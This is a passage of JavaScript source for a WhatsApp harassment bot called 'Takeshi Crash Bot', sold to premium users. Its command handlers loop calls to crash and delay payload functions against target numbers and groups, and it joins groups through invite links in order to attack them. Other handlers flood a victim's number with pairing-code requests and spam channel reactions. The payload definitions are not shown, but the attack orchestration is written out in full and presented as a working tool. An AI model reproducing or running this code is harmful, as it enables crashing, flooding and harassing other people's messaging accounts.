            await FlowX(isTarget);
            await Loc(isTarget, 90000, false);
    await buttonnull(target)
    await sleep(500)
    await buttonnull(target)
    await protocolbug5(target, true)
    await buttonnull(target)
    await sleep(500)
    await buttonnull(target)
    await protocolbug5(target, true)
            await protocolbug5v2(2000);
            await SpaceGroup(isTarget);
            await protocolbug5v2(2000);
            await FlowX(isTarget);
            await protocolbug5v2(2000);
            await Loc(isTarget, 90000, false);    await X(target, true)
    await sleep(500) 
    await NaviFlex(target, true)
    await sleep(500)
    await NaviFlex(target, true)
    await NaviFlex(target, true)
    await sleep(500) 
    await NaviFlex(target, true)
            await SpaceGroup(isTarget);
            await protocolbug5v2(2000);
            await FlowX(isTarget);
            await delay(2000);
            await SpaceGroup(isTarget);
    await ransHardUi(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
            await protocolbug5v2(2000);
        }
    }
}
break;
//======================
case 'delay-groub': case 'small': { // 
    if (!isPremium) return m.reply("*You are not a Premium User*");
    
    if (!q) {
        return m.reply(`Example: ${prefix + command} ID / Link Group`);
    }

    let groupLink = args[0];
    let groupId;
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

    if (groupLink.includes('https://chat.whatsapp.com/')) {
        groupId = groupLink.split('https://chat.whatsapp.com/')[1];

        if (!groupId) {
            return m.reply(`❌ *𝖫𝗂𝗇𝗄 𝗍𝖺𝗎𝗍𝖺𝗇 𝗍𝗂𝖽𝖺𝗄 𝗏𝖺𝗅𝗂𝖽. 𝗅𝖾𝖻𝗂𝗁 𝖻𝖺𝗂𝗄 𝗀𝗎𝗇𝖺𝗄𝖺𝗇 𝗆𝖾𝗅𝖺𝗅𝗎𝗂 𝗂𝖽 𝖽𝖾𝗇𝗀𝖺𝗇 𝖼𝖺𝗋𝖺 𝗄𝖾𝗍𝗂𝗄 .𝖼𝖾𝗄𝗂𝖽𝗀𝖼*`);
        }

        try {
            let isTarget = await rikz.groupAcceptInvite(groupId);
            m.reply(`
✅ *_รuccεรรƒułłყ รεหd Ъugร тคяgεт_*

𝗌𝖾𝗇𝗍 𝗍𝗈 𝗀𝗋𝗈𝗎𝗉 𝗐𝗂𝗍𝗁 𝗅𝗂𝗇𝗄: ${groupLink}\n> _𝖧𝖺𝗋𝖺𝗉 𝗆𝖾𝗇𝗀𝗀𝗎𝗇𝖺𝗄𝖺𝗇 𝗃𝖾𝖽𝖺 𝗆𝗂𝗇𝗂𝗆𝖺𝗅 10 𝗆𝖾𝗇𝗂𝗍 𝖺𝗀𝖺𝗋 𝖻𝗈𝗍 𝗍𝖾𝗋𝗁𝗂𝗇𝖽𝖺𝗋 𝖽𝖺𝗋𝗂 𝗄𝖾𝗇𝗈𝗇_`);

            for (let r = 0; r < 3; r++) { 
            await FlowX(isTarget);
            await protocolbug5v2(2000);
            await SpaceGroup(isTarget);
            await protocolbug5v2(2000);
            await FlowX(isTarget);
            await protocolbug5v2(2000);
            await SpaceGroup(isTarget);
            await protocolbug5v2(2000);
            await FlowX(isTarget);
            await protocolbug5v2(2000);
            await SpaceGroup(isTarget);
            await protocolbug5v2(2000);
            }
        } catch (err) {
            return m.reply(`❌ *𝖫𝗂𝗇𝗄 𝗍𝖺𝗎𝗍𝖺𝗇 𝗍𝗂𝖽𝖺𝗄 𝗏𝖺𝗅𝗂𝖽. 𝗅𝖾𝖻𝗂𝗁 𝖻𝖺𝗂𝗄 𝗀𝗎𝗇𝖺𝗄𝖺𝗇 𝗆𝖾𝗅𝖺𝗅𝗎𝗂 𝗂𝖽 𝖽𝖾𝗇𝗀𝖺𝗇 𝖼𝖺𝗋𝖺 𝗄𝖾??𝗂?? .𝖼𝖾𝗄𝗂𝖽𝗀𝖼*`);
        }

    } else {
        let isTarget = groupLink;
        m.reply(`
✅ *_รuccεรรƒułłყ รεหd Ъugร тคяgεт_*

𝗌𝖾𝗇𝗍 𝗍𝗈 𝗀𝗋𝗈𝗎𝗉 𝗐𝗂𝗍𝗁 𝗅𝗂𝗇𝗄: ${groupLink}\n> _𝖧𝖺𝗋𝖺𝗉 𝗆𝖾𝗇𝗀𝗀𝗎𝗇𝖺𝗄𝖺𝗇 𝗃𝖾𝖽𝖺 𝗆𝗂𝗇𝗂𝗆𝖺𝗅 10 𝗆𝖾𝗇𝗂𝗍 𝖺𝗀𝖺𝗋 𝖻𝗈𝗍 𝗍𝖾𝗋𝗁𝗂𝗇𝖽𝖺𝗋 𝖽𝖺𝗋𝗂 𝗄𝖾𝗇𝗈𝗇_`);

        for (let r = 0; r < 3; r++) {
            await FlowX(isTarget);
            await protocolbug5v2(2000);
            await SpaceGroup(isTarget);
            await protocolbug5v2(2000);
            await FlowX(isTarget);
            await protocolbug5v2(2000);
            await SpaceGroup(isTarget);
            await protocolbug5v2(2000);
            await FlowX(isTarget);
            await protocolbug5v2(2000);
            await SpaceGroup(isTarget);
            await protocolbug5v2(2000);
        }
    }
}
break;
//======================
case 'public': {
if (!isCreator) return m.reply(mess.owner) 
if (rikz.public === true) return m.reply("Dari tadi udh public njr🤓");
rikz.public = true
m.reply(mess.succes)
}
break
//======================
case 'self': {
if (!isCreator) return m.reply(mess.owner) 
if (rikz.public === false) return m.reply("Dari tadi udh self njr🤓");
rikz.public = false
m.reply(mess.succes)
}
break
//======================
case "menu": {
let itsmenu = 
`Hii @${m.sender.split("@")[0]} 👋
Am Takeshi Crash Bot Designed To Help Use Or Send The Latest Whatsapp System!! 

╭━( \`𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 𝗕𝗢𝗧\` )
┃猴 Developer : Gyzen Official
┃猴 BotName : Takeshi Crash
┃猴 Version : 2.0
┃猴 Status : Vvip Buy Only!!
╰━━━━━━━━━━━━━━━━

\`BUG DELAY\` 🦠
徴 .gyzen-ui
徴 .gyzen-delay
徴 .gyzen-delayv2
徴 .delay-system
徴 .combo-dor
徴 .invis-hard

\`BUG IOS\`🕊
徴 .combo-ios
徴 .invis-ios
徴 .ios-fc

\`BUG BULLDOZER\`
徴 .bulldozer

\`BUG GRUB\`👻
徴 .delay-groub
徴 .hard-grub

\`FUNN\` ✨
徴 .spamreactch
徴 .spam-pairing

\`ACCES OWNER\` ⚡
徴 .addmurbug
徴 .delmurbug
徴 .self
徴 .public

➣ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 𝗦𝗖𝗥𝗜𝗣𝗧 』
https://whatsapp.com/channel/0029VbB6Dh9Fcow11kpiNH3d
> © Gyzen Developer`;
await rikz.sendMessage(m.chat, {
image: { url: "https://img1.pixhost.to/images/7043/619680277_kremonhost.jpg" },
caption: itsmenu
}, { quoted: m });
}
break; 
//======================
case "addmurbug": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply("❌ Example: /addmurbug (nomor)");
let user = text.replace(/[^\d]/g, "");
addPremiumUser(user, 30);
m.reply(`✅ Add murbug:\n• ${user} (30 days)`)}
break;
//======================
case "delmurbug": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply("❌ Example: /delmurbug (nomor)");
let user = text.replace(/[^\d]/g, ""); 
let removed = delPremiumUser(user);
m.reply(removed ? `✅ Removed murbug:\n• ${user}` : "❌ User tidak ditemukan")}
break;
//======================
//case reactch
  case "spamreactch": {

if (!isPremium) return m.reply('Khusus Premium');

if (!text) return m.reply(".spamreactch linkpesan 😂")

if (!args[0] || !args[1]) return m.reply("Wrong Format")

if (!args[0].includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")

let result = args[0].split('/')[4]

let serverId = args[0].split('/')[5]

let res = await rikz.newsletterMetadata("invite", result)

await rikz.newsletterReactMessage(res.id, serverId, args[1])

m.reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)

}

break      
//case spam pair
//======================
case 'spam-pairing': {
  if (!isPremium) return m.reply('Khusus Premium');
  if (!text) return m.reply(`*Example:* ${prefix + command} 628xxxxxx|150`);
  m.reply('proses...');
  let [peenis, pepekk = "200"] = text.split("|");
  let target = peenis.replace(/[^0-9]/g, '').trim();
  const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
  const { state } = await useMultiFileAuthState('pepek');
  const { version } = await fetchLatestBaileysVersion();
  const pino = require("pino");
  const sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
  for (let i = 0; i < pepekk; i++) {
    await sleep(1500);
    let prc = await sucked.requestPairingCode(target);
    console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`);
  }
  await sleep(15000);
}
break;

//======================
default:
}} catch (err) {
console.log('\x1b[1;31m'+err+'\x1b[0m')}}